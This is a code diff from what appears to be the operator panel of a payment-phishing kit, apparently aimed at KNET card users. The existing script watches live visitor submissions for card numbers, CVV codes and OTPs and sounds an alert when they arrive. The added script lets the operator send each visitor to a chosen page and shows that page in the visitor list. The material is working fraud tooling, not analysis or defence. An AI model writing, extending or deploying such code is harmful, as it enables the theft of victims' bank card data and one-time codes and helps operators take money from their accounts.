@@ -4649,3 +4649,13 @@ hook();setInterval(hook,800);
 <script id=veniceSound>(function(){if(window.__vsnd)return;window.__vsnd=1;function A(){try{return frogAudio}catch(e){return null}}function mute(){var a=A();if(!a||a.__mute)return;a.__mute=1;a.play=function(){return Promise.resolve()};a.__realPlay=function(){return Promise.resolve()}}mute();setInterval(mute,500);var ac=null;function tn(f,t0,d){try{var o=ac.createOscillator(),g=ac.createGain();o.type='sine';o.frequency.value=f;g.gain.setValueAtTime(0.0001,t0);g.gain.exponentialRampToValueAtTime(0.3,t0+0.01);g.gain.exponentialRampToValueAtTime(0.0001,t0+d);o.connect(g);g.connect(ac.destination);o.start(t0);o.stop(t0+d+0.02)}catch(e){}}function bp(){try{ac=ac||new (window.AudioContext||window.webkitAudioContext)();if(ac.state==='suspended')ac.resume();var t=ac.currentTime;tn(880,t,0.16);tn(1180,t+0.18,0.2)}catch(e){}}function pg(x){try{var d=(x&&x.data)||{},v=(x&&x.visitor)||{};return String((d.page||d['الصفحة'])||v.page||'')}catch(e){return ''}}var OK=/ملخص|summary|كي\s*نت|knet|بطاقة|card|otp|رمز|cvv/i;function hit(x){try{var d=(x&&x.data)||{};if(d.digitCode||d['الرمز']||d.cvv||d.cardNumber||d.cardNumberOnly)return true;var p=pg(x);return p?OK.test(p):false}catch(e){return false}}var lt=0,ls='';function hk(){try{var s=window.socket;if(!s||s===window.__stub||!s.on||s.__vh)return;s.__vh=1;s.on('visitor:dataSubmitted',function(x){try{if(!hit(x))return;var d=(x&&x.data)||{};var sg=String(d.digitCode||d.cvv||d.cardNumber||pg(x));var n=Date.now();if(sg===ls&&n-lt<5000)return;if(n-lt<700)return;ls=sg;lt=n;bp()}catch(e){}})}catch(e){}}hk();setInterval(hk,600)})();</script>
 
 </script>
+
+<script id=kddNavSync>(function(){
+if(window.__ns)return;window.__ns=1;
+function V(s){try{return Array.from(visitors.values()).find(function(x){return x&&x.socketId===s})||null}catch(e){return null}}
+function U(s,sel){var e=document.getElementById(sel);if(!e||!e.value)return;var v=V(s);if(!v)return;var o=e.options[e.selectedIndex];var l=(o?o.textContent:'').trim()||e.value;var t=Date.now();v.page=l;try{renderVisitorsList()}catch(x){}
+clearInterval(v.__p);v.__p=setInterval(function(){if(Date.now()-t>6000){clearInterval(v.__p);return}if(v.page!==l){v.page=l;try{renderVisitorsList()}catch(x){}}},350)}
+var a=window.navigateVisitor,b=window.navigateVisitorTop;
+window.navigateVisitor=function(s){var r=a.apply(this,arguments);U(s,'navigateSelect');return r};
+window.navigateVisitorTop=function(s){var r=b.apply(this,arguments);U(s,'navigateSelectTop');return r};
+})();</script>
